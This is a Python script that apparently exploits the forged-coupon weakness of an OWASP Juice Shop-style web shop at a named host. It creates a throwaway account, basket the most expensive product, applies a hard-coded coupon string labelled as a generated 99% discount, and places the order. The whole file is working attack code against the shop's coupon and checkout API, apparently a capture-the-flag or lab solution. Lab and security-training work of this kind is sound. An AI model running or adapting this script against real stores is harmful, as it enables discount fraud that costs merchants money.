#!/usr/bin/env python3

import requests
import time

def test_99_percent_coupon():
    print("🎯 TESTING 99% DISCOUNT COUPON")
    print("Generated: OCT25-99 → pEw8ph7Z*G")
    
    base_url = "https://juice5.wonkatech.org"
    session = requests.Session()
    
    # Quick auth
    email = f"test99{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Authenticated")
        
        # Add most expensive product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        expensive = max(products, key=lambda p: p['price'])
        
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": expensive['id'], "quantity": 1
        })
        
        print(f"🛒 Added: {expensive['name']} - Original: ${expensive['price']}")
        
        # Get basket
        user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
        basket_id = user_data.get('bid', 1)
        
        # Apply 99% discount coupon
        coupon_99 = "pEw8ph7Z*G"  # OCT25-99
        
        print(f"\\n💰 Applying 99% discount coupon: {coupon_99}")
        
        coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon_99}", json={})
        
        if coupon_response.status_code == 200:
            result = coupon_response.json()
            discount = result.get('discount', 0)
            
            print(f"   ✅ SUCCESS! {discount}% discount applied!")
            
            # Calculate savings
            original_price = expensive['price']
            discounted_price = original_price * (1 - discount / 100)
            savings = original_price - discounted_price
            
            print(f"   Original price: ${original_price:,.2f}")
            print(f"   Discounted price: ${discounted_price:,.2f}")
            print(f"   💰 YOU SAVE: ${savings:,.2f} ({discount}% off!)")
            
            if discount == 99:
                print(f"   🔥 MAXIMUM DISCOUNT ACHIEVED!")
                print(f"   🎯 Pay only ${discounted_price:,.2f} instead of ${original_price:,.2f}!")
            
            # Complete checkout to finalize the extreme discount
            print(f"\\n🛍️  Completing checkout with 99% discount...")
            checkout = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
            
            if checkout.status_code in [200, 201]:
                print(f"   🎉 ORDER PLACED WITH 99% DISCOUNT!")
                print(f"   💸 Total paid: ${discounted_price:,.2f} (saved ${savings:,.2f})")
            else:
                print(f"   Checkout status: {checkout.status_code}")
        else:
            print(f"   ❌ Coupon failed: {coupon_response.text}")

test_99_percent_coupon()
